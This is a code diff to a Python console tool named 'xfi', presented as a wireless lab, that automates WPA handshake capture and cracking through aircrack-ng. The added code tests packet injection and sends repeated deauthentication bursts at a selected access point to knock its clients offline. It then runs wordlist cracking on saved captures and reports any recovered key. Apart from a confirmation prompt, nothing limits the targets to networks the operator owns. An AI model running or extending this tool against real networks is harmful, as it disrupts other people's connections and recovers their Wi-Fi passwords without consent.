@@ -8,6 +8,7 @@ import os
 import re
 import shutil
 import subprocess
+import sys
 import time
 from dataclasses import asdict, dataclass, field
 from datetime import datetime
@@ -16,12 +17,17 @@ from typing import Optional
 
 from rich import box
 from rich.console import Console
+from rich.live import Live
 from rich.panel import Panel
 from rich.prompt import Confirm, Prompt
 from rich.table import Table
 from rich.text import Text
 
 console = Console()
+
+
+class BackToMenu(Exception):
+    """Ctrl+C in a submenu returns to the main menu."""
 
 APP_NAME = "xfi"
 TOOL_DIR = Path(__file__).resolve().parent
@@ -31,6 +37,17 @@ DEAUTH_COUNT = 5
 DEAUTH_BURSTS = 8
 DEAUTH_GAP_SEC = 8
 AIRODUMP_WARMUP_SEC = 4
+TOOL_PACKAGES = {
+    "airmon-ng": "aircrack-ng",
+    "airodump-ng": "aircrack-ng",
+    "aireplay-ng": "aircrack-ng",
+    "aircrack-ng": "aircrack-ng",
+    "cowpatty": "cowpatty",
+    "iw": "iw",
+    "nmcli": "network-manager",
+}
+REQUIRED_BINS = ("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng")
+OPTIONAL_BINS = ("cowpatty", "iw", "nmcli")
 
 
 def effective_home() -> Path:
@@ -95,8 +112,24 @@ def save_settings(settings: Settings) -> None:
     CONFIG_FILE.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")
 
 
+def ask(message: str, *, default: str = "", exit_on_interrupt: bool = False) -> str:
+    try:
+        return Prompt.ask(f"{message}", default=default, show_default=False)
+    except KeyboardInterrupt:
+        if exit_on_interrupt:
+            raise
+        raise BackToMenu from None
+
+
+def confirm(message: str, *, default: bool = False) -> bool:
+    try:
+        return Confirm.ask(message, default=default)
+    except KeyboardInterrupt:
+        raise BackToMenu from None
+
+
 def pause(message: str = "Press Enter to go back...") -> None:
-    Prompt.ask(f"[dim]{message}[/dim]", default="", show_default=False)
+    ask(f"[dim]{message}[/dim]")
 
 
 def warn_and_back(title: str, body: str) -> None:
@@ -293,38 +326,47 @@ def clear_screen() -> None:
     console.clear()
 
 
+def menu_value(text: str, set_: bool) -> str:
+    if set_ and text:
+        return f"[bold green]{text}[/bold green]"
+    return "[dim]not set[/dim]"
+
+
 def render_banner(settings: Settings) -> None:
     title = Text()
     title.append("XFI", style="bold cyan")
     title.append("  ·  ", style="dim")
-    title.append("Wireless lab setup console", style="white")
-
-    iface = settings.interface or "[not set]"
-    word = Path(settings.wordlist).name if settings.wordlist else "[not set]"
-    target = settings.target.ssid or "[not set]"
-
-    status = Table.grid(expand=True)
-    status.add_column(justify="right")
-    status.add_column(justify="left")
-    status.add_row("[bold]Adapter[/bold]", f"[cyan]{iface}[/cyan]")
-    status.add_row("[bold]Wordlist[/bold]", f"[cyan]{word}[/cyan]")
-    status.add_row("[bold]Target[/bold]", f"[cyan]{target}[/cyan]")
-
+    title.append("Wireless lab", style="white")
     console.print(Panel(title, subtitle="Lab console — aircrack-ng capture + crack", border_style="cyan", box=box.DOUBLE))
-    console.print(Panel(status, title="Current settings", border_style="blue", box=box.ROUNDED))
 
 
-def render_menu() -> None:
+def render_menu(settings: Settings) -> None:
+    adapter = menu_value(settings.interface, bool(settings.interface))
+    if settings.target.ssid:
+        target_label = settings.target.ssid
+        if settings.target.bssid:
+            target_label = f"{settings.target.ssid}  ({settings.target.bssid})"
+        target = menu_value(target_label, True)
+    else:
+        target = menu_value("", False)
+    word = menu_value(Path(settings.wordlist).name if settings.wordlist else "", bool(settings.wordlist))
+
     table = Table(show_header=False, box=box.SIMPLE, expand=True, padding=(0, 1))
     table.add_column("key", style="bold yellow", width=4)
     table.add_column("label")
-    table.add_row("1", "Select a network adapter")
-    table.add_row("2", "Discover networks and select a test target")
-    table.add_row("3", "Select a password wordlist file")
-    table.add_row("4", "Show current settings")
-    table.add_row("5", "Start (uses saved settings)")
-    table.add_row("0", "Exit")
-    console.print(Panel(table, title="Main menu", border_style="green", box=box.ROUNDED))
+    table.add_column("value", justify="right", overflow="ellipsis", no_wrap=True)
+    table.add_row("1", "Select a network adapter", adapter)
+    table.add_row("2", "Discover networks and select a test target", target)
+    table.add_row("3", "Select a password wordlist file", word)
+    table.add_row("4", "Show current settings", "")
+    table.add_row("5", "Capture handshake", "")
+    table.add_row("6", "Crack a saved handshake", "")
+    missing_n = len(missing_bins())
+    tools_status = (
+        f"[yellow]{missing_n} missing[/yellow]" if missing_n else "[bold green]all OK[/bold green]"
+    )
+    table.add_row("7", "Check / install tools", tools_status)
+    console.print(Panel(table, title="Main menu", subtitle="Ctrl+C to exit", border_style="green", box=box.ROUNDED))
 
 
 def require_interface(settings: Settings) -> bool:
@@ -347,6 +389,99 @@ def which_or_none(*names: str) -> Optional[str]:
     return None
 
 
+def missing_bins(names: tuple[str, ...] | None = None) -> list[str]:
+    check = names if names is not None else REQUIRED_BINS + OPTIONAL_BINS
+    return [name for name in check if not which_or_none(name)]
+
+
+def packages_for(bins: list[str]) -> list[str]:
+    pkgs: list[str] = []
+    for name in bins:
+        pkg = TOOL_PACKAGES.get(name, name)
+        if pkg not in pkgs:
+            pkgs.append(pkg)
+    return pkgs
+
+
+def require_bins(names: tuple[str, ...]) -> bool:
+    missing = missing_bins(names)
+    if not missing:
+        return True
+    pkgs = packages_for(missing)
+    warn_and_back(
+        "Missing tools",
+        "These commands are not installed:\n"
+        + ", ".join(f"[bold]{n}[/bold]" for n in missing)
+        + "\n\nChoose [bold]7 — Check / install tools[/bold] to install:\n"
+        + ", ".join(pkgs),
+    )
+    return False
+
+
+def action_install_tools() -> None:
+    if not ensure_root("install"):
+        return
+
+    clear_screen()
+    render_banner(load_settings())
+    table = Table(box=box.SIMPLE_HEAVY, expand=True)
+    table.add_column("Command")
+    table.add_column("Package")
+    table.add_column("Need")
+    table.add_column("Status")
+    for name in REQUIRED_BINS + OPTIONAL_BINS:
+        found = which_or_none(name)
+        need = "required" if name in REQUIRED_BINS else "optional"
+        status = f"[bold green]{found}[/bold green]" if found else "[yellow]missing[/yellow]"
+        table.add_row(name, TOOL_PACKAGES[name], need, status)
+    console.print(Panel(table, title="Tool check", border_style="cyan"))
+
+    missing = missing_bins()
+    if not missing:
+        console.print("\n[green]All tools are installed.[/green]")
+        pause()
+        return
+
+    pkgs = packages_for(missing)
+    apt = which_or_none("apt-get")
+    if not apt:
+        warn_and_back(
+            "No apt-get",
+            "Could not find apt-get. Install these packages with your package manager:\n"
+            + " ".join(pkgs),
+        )
+        return
+
+    console.print(f"\nMissing packages: [bold]{' '.join(pkgs)}[/bold]\n")
+    if not confirm("Install with apt-get now?", default=True):
+        return
+
+    env = os.environ.copy()
+    env["DEBIAN_FRONTEND"] = "noninteractive"
+    console.print("\n[dim]apt-get update...[/dim]")
+    update = subprocess.run([apt, "update"], env=env)
+    console.print("\n[dim]apt-get install -y " + " ".join(pkgs) + "...[/dim]\n")
+    install = subprocess.run([apt, "install", "-y", *pkgs], env=env)
+    if update.returncode != 0 or install.returncode != 0:
+        warn_and_back(
+            "Install failed",
+            "apt-get reported an error. Fix the package manager, then try option 7 again.",
+        )
+        return
+
+    still = missing_bins()
+    if still:
+        warn_and_back(
+            "Still missing",
+            "Installed packages, but these commands are still not on PATH:\n"
+            + ", ".join(still),
+        )
+        return
+
+    console.print("\n[green]All tools are now installed.[/green]")
+    pause()
+
+
 def run_cmd(cmd: list[str], timeout: int = 60) -> tuple[int, str]:
     try:
         proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
@@ -358,18 +493,30 @@ def run_cmd(cmd: list[str], timeout: int = 60) -> tuple[int, str]:
         return 1, f"Timed out after {timeout}s: {' '.join(cmd)}"
 
 
-def require_root() -> bool:
+def ensure_root(resume: str) -> bool:
     if os.geteuid() == 0:
         return True
-    warn_and_back(
-        "Root required",
-        "Start needs root to run airmon-ng / airodump-ng / aireplay-ng.\n"
-        "Re-run with: [bold]sudo ./xfi[/bold]",
-    )
+    sudo = which_or_none("sudo")
+    if not sudo:
+        warn_and_back(
+            "Root required",
+            "This action needs root, and [bold]sudo[/bold] was not found.\n"
+            "Run the tool as root, then try again.",
+        )
+        return False
+    script = str(Path(__file__).resolve())
+    console.print("\n[yellow]Root required — restarting with sudo...[/yellow]\n")
+    try:
+        os.execvp(
+            sudo,
+            [sudo, "-E", sys.executable, script, f"--resume={resume}"],
+        )
+    except OSError as exc:
+        warn_and_back("sudo failed", str(exc))
     return False
 
 
-def require_ready(settings: Settings) -> bool:
+def require_capture_ready(settings: Settings) -> bool:
     missing: list[str] = []
     if not settings.interface:
         missing.append("network adapter (menu 1)")
@@ -377,17 +524,27 @@ def require_ready(settings: Settings) -> bool:
         missing.append("test target BSSID (menu 2)")
     if not settings.target.channel or settings.target.channel in {"-", "?"}:
         missing.append("target channel (menu 2)")
-    wordlist = Path(settings.wordlist) if settings.wordlist else None
-    if not wordlist or not wordlist.is_file():
-        missing.append("password wordlist file (menu 3)")
     if missing:
         warn_and_back(
             "Settings incomplete",
-            "Set the following, then try Start again:\n\n"
+            "Set the following, then try Capture again:\n\n"
             + "\n".join(f"• {item}" for item in missing),
         )
         return False
     return True
+
+
+def require_wordlist(settings: Settings) -> bool:
+    wordlist = Path(settings.wordlist) if settings.wordlist else None
+    if wordlist and wordlist.is_file():
+        return True
+    warn_and_back(
+        "Wordlist required",
+        "No password wordlist is selected yet.\n"
+        "Choose [bold]3 — Select a password wordlist file[/bold] from the menu,\n"
+        "then try again.",
+    )
+    return False
 
 
 def safe_filename(ssid: str) -> str:
@@ -527,6 +684,65 @@ def run_deauth(mon: str, bssid: str, count: int = DEAUTH_COUNT) -> tuple[int, st
     )
 
 
+def test_injection(mon: str) -> tuple[bool, str]:
+    aireplay = which_or_none("aireplay-ng")
+    if not aireplay:
+        return False, "aireplay-ng was not found on PATH"
+    code, out = run_cmd([aireplay, "-9", "-D", mon], timeout=25)
+    low = out.lower()
+    if "injection is working" in low:
+        return True, out
+    if "injection is not working" in low:
+        return False, out or "Injection is not working on this adapter"
+    if code == 0 and "inject" in low:
+        return True, out
+    return False, out or "Injection test failed (adapter may lack packet injection)"
+
+
+def format_bytes(size: int) -> str:
+    if size < 1024:
+        return f"{size} B"
+    if size < 1024 * 1024:
+        return f"{size / 1024:.1f} KB"
+    return f"{size / (1024 * 1024):.1f} MB"
+
+
+def cap_size_label(capfile: Optional[Path]) -> str:
+    if not capfile or not capfile.exists():
+        return "0 B"
+    try:
+        return format_bytes(capfile.stat().st_size)
+    except OSError:
+        return "?"
+
+
+def render_capture_progress(
+    elapsed: float,
+    timeout: int,
+    burst: int,
+    captured: bool,
+    capfile: Optional[Path],
+    note: str,
+) -> Panel:
+    remaining = max(0, int(timeout - elapsed))
+    pct = 0.0 if timeout <= 0 else min(1.0, elapsed / timeout)
+    width = 32
+    filled = int(width * pct)
+    bar = "█" * filled + "░" * (width - filled)
+    hs = "[bold green]YES[/bold green]" if captured else "[yellow]waiting[/yellow]"
+    cap_name = capfile.name if capfile else "—"
+    table = Table.grid(padding=(0, 1), expand=True)
+    table.add_column(style="bold", width=12)
+    table.add_column()
+    table.add_row("Time", f"{int(elapsed):>3}s / {timeout}s   ({remaining}s left)")
+    table.add_row("Progress", f"[cyan]{bar}[/cyan]  {int(pct * 100)}%")
+    table.add_row("Deauth", f"burst {min(burst, DEAUTH_BURSTS)}/{DEAUTH_BURSTS}")
+    table.add_row("Handshake", hs)
+    table.add_row("Capture", f"{cap_name}  ({cap_size_label(capfile)})")
+    table.add_row("Status", note)
+    return Panel(table, title="Capture progress", border_style="cyan", box=box.ROUNDED)
+
+
 def latest_cap(prefix: Path) -> Optional[Path]:
     caps = list(prefix.parent.glob(prefix.name + "-*.cap"))
     caps += list(prefix.parent.glob(prefix.name + "-*.pcap"))
@@ -562,12 +778,68 @@ def handshake_captured(capfile: Path, bssid: str) -> bool:
     return False
 
 
+def list_cap_files(folder: Path) -> list[Path]:
+    if not folder.is_dir():
+        return []
+    caps = [p for p in folder.iterdir() if p.is_file() and p.suffix.lower() in {".cap", ".pcap"}]
+    caps.sort(key=lambda p: p.stat().st_mtime, reverse=True)
+    return caps
+
+
+def networks_in_cap(capfile: Path) -> list[dict[str, str]]:
+    aircrack = which_or_none("aircrack-ng")
+    if not aircrack:
+        return []
+    _code, out = run_cmd([aircrack, str(capfile)], timeout=12)
+    rows: list[dict[str, str]] = []
+    for line in out.splitlines():
+        match = re.search(
+            r"^\s*(\d+)\s+([0-9A-Fa-f:]{17})\s+(.*?)\s+WPA[^\n]*handshake",
+            line,
+        )
+        if not match:
+            continue
+        rows.append(
+            {
+                "index": match.group(1),
+                "bssid": match.group(2),
+                "ssid": match.group(3).strip() or "<hidden>",
+                "line": line.strip(),
+            }
+        )
+    return rows
+
+
+def show_crack_result(key: Optional[str], capfile: Path) -> None:
+    if key:
+        console.print(
+            Panel(
+                f"KEY FOUND: [bold green]{key}[/bold green]\n\nCapture: {capfile}",
+                title="Result",
+                border_style="green",
+                box=box.ROUNDED,
+            )
+        )
+        return
+    console.print(
+        Panel(
+            "No key found in the selected wordlist.\n"
+            f"Handshake kept at:\n{capfile}",
+            title="Result",
+            border_style="yellow",
+            box=box.ROUNDED,
+        )
+    )
+
+
 def crack_capture(capfile: Path, bssid: str, wordlist: str) -> tuple[Optional[str], str]:
     aircrack = which_or_none("aircrack-ng")
     if not aircrack:
         return None, "aircrack-ng was not found on PATH"
 
-    cmd = [aircrack, "-a2", "-b", bssid, "-w", wordlist, str(capfile)]
+    cmd = [aircrack, "-a2", "-w", wordlist, str(capfile)]
+    if bssid:
+        cmd = [aircrack, "-a2", "-b", bssid, "-w", wordlist, str(capfile)]
     console.print(f"[dim]$ {' '.join(cmd)}[/dim]\n")
     try:
         proc = subprocess.Popen(
@@ -582,14 +854,22 @@ def crack_capture(capfile: Path, bssid: str, wordlist: str) -> tuple[Optional[st
     collected: list[str] = []
     found: Optional[str] = None
     assert proc.stdout is not None
-    for line in proc.stdout:
-        text = line.rstrip("\n")
-        collected.append(text)
-        console.print(text)
-        match = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", text)
-        if match:
-            found = match.group(1)
-    proc.wait()
+    try:
+        for line in proc.stdout:
+            text = line.rstrip("\n")
+            collected.append(text)
+            console.print(text)
+            match = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", text)
+            if match:
+                found = match.group(1)
+        proc.wait()
+    except KeyboardInterrupt:
+        proc.terminate()
+        try:
+            proc.wait(timeout=5)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+        raise BackToMenu from None
     output = "\n".join(collected)
     if found:
         return found, output
@@ -598,8 +878,10 @@ def crack_capture(capfile: Path, bssid: str, wordlist: str) -> tuple[Optional[st
     return None, output
 
 
-def action_start(settings: Settings) -> None:
-    if not require_root() or not require_ready(settings):
+def action_capture(settings: Settings) -> None:
+    if not ensure_root("capture") or not require_capture_ready(settings):
+        return
+    if not require_bins(REQUIRED_BINS):
         return
 
     handshake_dir = Path(settings.handshake_dir or DEFAULT_HANDSHAKE_DIR)
@@ -617,14 +899,13 @@ def action_start(settings: Settings) -> None:
     summary.add_row("Adapter", settings.interface)
     summary.add_row("Target", f"{settings.target.ssid}  ({settings.target.bssid})")
     summary.add_row("Channel", settings.target.channel)
-    summary.add_row("Wordlist", settings.wordlist)
     summary.add_row("Handshake dir", str(handshake_dir))
-    console.print(Panel(summary, title="Start", border_style="yellow"))
+    console.print(Panel(summary, title="Capture handshake", border_style="yellow"))
     console.print(
         "[yellow]Deauthentication will briefly disconnect clients on this access point "
         "so a WPA handshake can be captured.[/yellow]\n"
     )
-    if not Confirm.ask("Continue?", default=False):
+    if not confirm("Continue?", default=False):
         return
 
     stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -639,9 +920,12 @@ def action_start(settings: Settings) -> None:
     restored = False
 
     try:
-        console.print("\n[dim]Enabling monitor mode...[/dim]")
+        console.print("\n[dim]Checking adapter: monitor mode...[/dim]")
         mon, mon_out = enable_monitor(base_iface, channel)
         if not mon:
+            console.print("[dim]Restoring adapter / NetworkManager...[/dim]")
+            stop_monitor(mon, base_iface)
+            restored = True
             warn_and_back(
                 "Monitor mode failed",
                 mon_out
@@ -651,48 +935,128 @@ def action_start(settings: Settings) -> None:
             return
         console.print(f"[green]Monitor interface:[/green] [bold]{mon}[/bold]")
 
+        console.print("[dim]Checking adapter: packet injection...[/dim]")
+        inject_ok, inject_out = test_injection(mon)
+        if not inject_ok:
+            last_lines = "\n".join(inject_out.splitlines()[-8:]) if inject_out else ""
+            console.print("[dim]Restoring adapter / NetworkManager...[/dim]")
+            stop_monitor(mon, base_iface)
+            restored = True
+            warn_and_back(
+                "Injection test failed",
+                "This adapter cannot inject packets, so capture would likely stall.\n"
+                "Stopped immediately instead of waiting for the timeout.\n\n"
+                + (last_lines or "No output from aireplay-ng -9."),
+            )
+            return
+
+        console.print("[green]Injection test passed.[/green]")
+
         dump_proc, dump_err = start_airodump(mon, bssid, channel, prefix)
         if dump_err or dump_proc is None:
             warn_and_back("Capture failed", dump_err or "airodump-ng did not start")
             return
 
-        console.print(
-            f"[dim]Capturing to {prefix}-01.cap  (timeout {CAPTURE_TIMEOUT_SEC}s)[/dim]"
-        )
-        time.sleep(AIRODUMP_WARMUP_SEC)
-
-        deadline = time.time() + CAPTURE_TIMEOUT_SEC
+        started = time.time()
         burst = 0
-        while time.time() < deadline:
-            capfile = latest_cap(prefix)
-            if capfile and handshake_captured(capfile, bssid):
-                captured = True
-                break
-
-            burst += 1
-            if burst <= DEAUTH_BURSTS:
-                console.print(
-                    f"[dim]Deauth burst {burst}/{DEAUTH_BURSTS} "
-                    f"({DEAUTH_COUNT} frames) -> {bssid}[/dim]"
-                )
-                code, out = run_deauth(mon, bssid)
-                if code != 0:
-                    console.print(
-                        f"[yellow]aireplay-ng warning:[/yellow] {out.splitlines()[-1] if out else code}"
-                    )
-            else:
-                console.print("[dim]Waiting for handshake...[/dim]")
-
-            slept = 0.0
-            while slept < DEAUTH_GAP_SEC and time.time() < deadline:
-                time.sleep(1)
-                slept += 1
+        last_hs_check = 0.0
+        note = "Warming up airodump-ng..."
+        with Live(
+            render_capture_progress(0, CAPTURE_TIMEOUT_SEC, 0, False, None, note),
+            console=console,
+            refresh_per_second=4,
+        ) as live:
+            time.sleep(AIRODUMP_WARMUP_SEC)
+            deadline = started + CAPTURE_TIMEOUT_SEC
+            while time.time() < deadline:
+                elapsed = time.time() - started
                 capfile = latest_cap(prefix)
-                if capfile and handshake_captured(capfile, bssid):
-                    captured = True
+                live.update(
+                    render_capture_progress(
+                        elapsed, CAPTURE_TIMEOUT_SEC, burst, captured, capfile, note
+                    )
+                )
+
+                if capfile and elapsed - last_hs_check >= 3:
+                    note = "Checking for handshake..."
+                    live.update(
+                        render_capture_progress(
+                            elapsed, CAPTURE_TIMEOUT_SEC, burst, captured, capfile, note
+                        )
+                    )
+                    if handshake_captured(capfile, bssid):
+                        captured = True
+                        note = "Handshake captured"
+                        live.update(
+                            render_capture_progress(
+                                elapsed, CAPTURE_TIMEOUT_SEC, burst, captured, capfile, note
+                            )
+                        )
+                        break
+                    last_hs_check = elapsed
+
+                if captured:
                     break
-            if captured:
-                break
+
+                burst += 1
+                if burst <= DEAUTH_BURSTS:
+                    note = f"Deauth burst {burst}/{DEAUTH_BURSTS}"
+                    live.update(
+                        render_capture_progress(
+                            time.time() - started,
+                            CAPTURE_TIMEOUT_SEC,
+                            burst,
+                            captured,
+                            capfile,
+                            note,
+                        )
+                    )
+                    code, out = run_deauth(mon, bssid)
+                    if code != 0:
+                        tail = out.splitlines()[-1] if out else str(code)
+                        note = f"aireplay-ng warning: {tail}"
+                else:
+                    note = "Waiting for a client to reconnect..."
+
+                gap_end = time.time() + DEAUTH_GAP_SEC
+                while time.time() < gap_end and time.time() < deadline:
+                    elapsed = time.time() - started
+                    capfile = latest_cap(prefix)
+                    live.update(
+                        render_capture_progress(
+                            elapsed, CAPTURE_TIMEOUT_SEC, burst, captured, capfile, note
+                        )
+                    )
+                    if capfile and elapsed - last_hs_check >= 3:
+                        note = "Checking for handshake..."
+                        live.update(
+                            render_capture_progress(
+                                elapsed, CAPTURE_TIMEOUT_SEC, burst, captured, capfile, note
+                            )
+                        )
+                        if handshake_captured(capfile, bssid):
+                            captured = True
+                            note = "Handshake captured"
+                            live.update(
+                                render_capture_progress(
+                                    elapsed,
+                                    CAPTURE_TIMEOUT_SEC,
+                                    burst,
+                                    captured,
+                                    capfile,
+                                    note,
+                                )
+                            )
+                            break
+                        last_hs_check = elapsed
+                        note = (
+                            f"Deauth burst {burst}/{DEAUTH_BURSTS}"
+                            if burst <= DEAUTH_BURSTS
+                            else "Waiting for a client to reconnect..."
+                        )
+                    time.sleep(0.4)
+                if captured:
+                    break
 
         stop_airodump(dump_proc)
         dump_proc = None
@@ -703,46 +1067,100 @@ def action_start(settings: Settings) -> None:
         restored = True
 
         if not captured:
-            extra = ""
-            if capfile:
-                extra = f"\nCapture file kept at:\n{capfile}"
+            extra = f"\nCapture file kept at:\n{capfile}" if capfile else ""
             warn_and_back(
                 "No handshake captured",
                 "Timed out before a WPA handshake was seen.\n"
-                "Injection may be unsupported on this adapter, or no client reconnected."
+                "No client reconnected, or the signal is too weak."
                 + extra,
             )
             return
 
-        console.print(f"\n[green]Handshake saved:[/green] [bold]{capfile}[/bold]\n")
-        console.print("[dim]Running aircrack-ng against the wordlist...[/dim]\n")
-        key, _out = crack_capture(capfile, bssid, settings.wordlist)
-        console.print()
-        if key:
-            console.print(
-                Panel(
-                    f"KEY FOUND: [bold green]{key}[/bold green]\n\nCapture: {capfile}",
-                    title="Result",
-                    border_style="green",
-                    box=box.ROUNDED,
-                )
+        console.print(
+            Panel(
+                f"Handshake saved:\n[bold]{capfile}[/bold]\n\n"
+                "Use [bold]6 — Crack a saved handshake[/bold] to test the wordlist.",
+                title="Capture complete",
+                border_style="green",
+                box=box.ROUNDED,
             )
-        else:
-            console.print(
-                Panel(
-                    "No key found in the selected wordlist.\n"
-                    f"Handshake kept at:\n{capfile}",
-                    title="Result",
-                    border_style="yellow",
-                    box=box.ROUNDED,
-                )
-            )
+        )
         pause()
+    except KeyboardInterrupt:
+        console.print("\n[yellow]Capture cancelled.[/yellow]")
     finally:
         stop_airodump(dump_proc)
         if not restored:
             console.print("[dim]Restoring adapter / NetworkManager...[/dim]")
             stop_monitor(mon, base_iface)
+
+
+def action_crack_saved(settings: Settings) -> None:
+    if not require_bins(("aircrack-ng",)):
+        return
+    if not require_wordlist(settings):
+        return
+
+    handshake_dir = Path(settings.handshake_dir or DEFAULT_HANDSHAKE_DIR)
+    caps = list_cap_files(handshake_dir)
+    if not caps:
+        warn_and_back(
+            "No capture files",
+            f"No .cap / .pcap files found in:\n{handshake_dir}\n\n"
+            "Run [bold]5 — Capture handshake[/bold] first.",
+        )
+        return
+
+    clear_screen()
+    render_banner(settings)
+    table = Table(box=box.SIMPLE_HEAVY, expand=True)
+    table.add_column("#", style="yellow", width=4)
+    table.add_column("File", style="cyan")
+    table.add_column("Size", justify="right")
+    table.add_column("Modified", style="dim")
+    for i, path in enumerate(caps, 1):
+        mtime = datetime.fromtimestamp(path.stat().st_mtime).strftime("%Y-%m-%d %H:%M")
+        table.add_row(str(i), path.name, format_bytes(path.stat().st_size), mtime)
+    console.print(Panel(table, title=f"Saved handshakes · {handshake_dir}", border_style="cyan"))
+    console.print(f"[dim]Wordlist: {settings.wordlist}[/dim]\n")
+
+    choice = ask("Capture number (Enter to go back)")
+    if not choice.strip():
+        return
+    if not choice.isdigit() or not (1 <= int(choice) <= len(caps)):
+        warn_and_back("Invalid choice", "Enter a number from the list.")
+        return
+
+    capfile = caps[int(choice) - 1]
+    networks = networks_in_cap(capfile)
+    with_hs = [n for n in networks if "0 handshake" not in n["line"].lower()]
+    candidates = with_hs or networks
+
+    bssid = settings.target.bssid
+    if candidates:
+        net_table = Table(box=box.SIMPLE, expand=True)
+        net_table.add_column("#", style="yellow", width=4)
+        net_table.add_column("BSSID")
+        net_table.add_column("SSID")
+        for i, net in enumerate(candidates, 1):
+            net_table.add_row(str(i), net["bssid"], net["ssid"])
+        console.print(Panel(net_table, title="Networks in capture", border_style="green"))
+        if len(candidates) == 1:
+            bssid = candidates[0]["bssid"]
+            console.print(f"[dim]Using BSSID {bssid}[/dim]\n")
+        else:
+            net_choice = ask("Network number (Enter uses saved target)")
+            if net_choice.isdigit() and 1 <= int(net_choice) <= len(candidates):
+                bssid = candidates[int(net_choice) - 1]["bssid"]
+            elif not bssid:
+                warn_and_back("BSSID required", "Pick a network from the capture list.")
+                return
+
+    console.print("[dim]Running aircrack-ng against the wordlist...[/dim]\n")
+    key, _out = crack_capture(capfile, bssid, settings.wordlist)
+    console.print()
+    show_crack_result(key, capfile)
+    pause()
 
 
 def action_select_interface(settings: Settings) -> None:
@@ -766,7 +1184,7 @@ def action_select_interface(settings: Settings) -> None:
         table.add_row(str(i), name + mark, iface_state(name))
     console.print(Panel(table, title="Wireless adapters", border_style="cyan"))
 
-    choice = Prompt.ask("Adapter number (or Enter to go back)", default="")
+    choice = ask("Adapter number (or Enter to go back)")
     if not choice.strip():
         return
     if not choice.isdigit() or not (1 <= int(choice) <= len(ifaces)):
@@ -795,7 +1213,7 @@ def action_select_wordlist(settings: Settings) -> None:
         console.print(Panel(table, title="Discovered wordlists", border_style="cyan"))
         console.print("[dim]Or type a full path to another file.[/dim]\n")
 
-    raw = Prompt.ask("List number or file path (Enter to go back)", default="").strip()
+    raw = ask("List number or file path (Enter to go back)").strip()
     if not raw:
         return
 
@@ -849,7 +1267,7 @@ def action_discover_and_select_target(settings: Settings) -> None:
         )
     console.print(Panel(table, title=f"Networks on {settings.interface}", border_style="green"))
 
-    choice = Prompt.ask("Target number (Enter to go back)", default="")
+    choice = ask("Target number (Enter to go back)")
     if not choice.strip():
         return
     if not choice.isdigit() or not (1 <= int(choice) <= len(rows)):
@@ -892,33 +1310,59 @@ def action_show_settings(settings: Settings) -> None:
     pause()
 
 
-def main() -> int:
+def main(argv: Optional[list[str]] = None) -> int:
+    argv = list(sys.argv[1:] if argv is None else argv)
+    resume = ""
+    for arg in argv:
+        if arg.startswith("--resume="):
+            resume = arg.split("=", 1)[1]
+
     settings = load_settings()
+    try:
+        if resume == "capture":
+            action_capture(settings)
+        elif resume == "crack":
+            action_crack_saved(settings)
+        elif resume == "install":
+            action_install_tools()
+    except BackToMenu:
+        pass
+    except KeyboardInterrupt:
+        console.print("\n[dim]Goodbye.[/dim]")
+        return 0
+
     while True:
-        clear_screen()
-        render_banner(settings)
-        render_menu()
-        choice = Prompt.ask("Choose a number", default="").strip()
-        if choice == "1":
-            action_select_interface(settings)
-        elif choice == "2":
-            action_discover_and_select_target(settings)
-        elif choice == "3":
-            action_select_wordlist(settings)
-        elif choice == "4":
-            action_show_settings(settings)
-        elif choice == "5":
-            action_start(settings)
-        elif choice in {"0", "q", "Q", "exit"}:
-            console.print("[dim]Goodbye.[/dim]")
+        try:
+            clear_screen()
+            render_banner(settings)
+            render_menu(settings)
+            choice = ask("Choose a number", exit_on_interrupt=True).strip()
+            if choice == "1":
+                action_select_interface(settings)
+            elif choice == "2":
+                action_discover_and_select_target(settings)
+            elif choice == "3":
+                action_select_wordlist(settings)
+            elif choice == "4":
+                action_show_settings(settings)
+            elif choice == "5":
+                action_capture(settings)
+            elif choice == "6":
+                action_crack_saved(settings)
+            elif choice == "7":
+                action_install_tools()
+            else:
+                warn_and_back("Unknown option", "Use 1–7. Ctrl+C to exit.")
+        except BackToMenu:
+            continue
+        except KeyboardInterrupt:
+            console.print("\n[dim]Goodbye.[/dim]")
             return 0
-        else:
-            warn_and_back("Unknown option", "Use 1, 2, 3, 4, 5, or 0 to exit.")
 
 
 if __name__ == "__main__":
     try:
         raise SystemExit(main())
     except KeyboardInterrupt:
-        console.print("\n[dim]Cancelled.[/dim]")
-        raise SystemExit(130)
+        console.print("\n[dim]Goodbye.[/dim]")
+        raise SystemExit(0)
